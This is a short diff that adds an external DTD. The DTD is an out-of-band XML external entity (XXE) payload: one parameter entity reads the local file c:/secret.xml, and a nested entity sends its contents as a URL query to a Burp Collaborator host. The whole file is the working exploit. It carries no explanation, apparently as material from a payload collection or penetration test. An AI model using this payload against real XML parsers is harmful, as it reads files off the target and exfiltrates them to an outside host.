@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///c:/secret.xml">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://bydxblw01mo3zun5jp0944njsay0mp.burpcollaborator.net/?%file;.xml'>">
+%all;
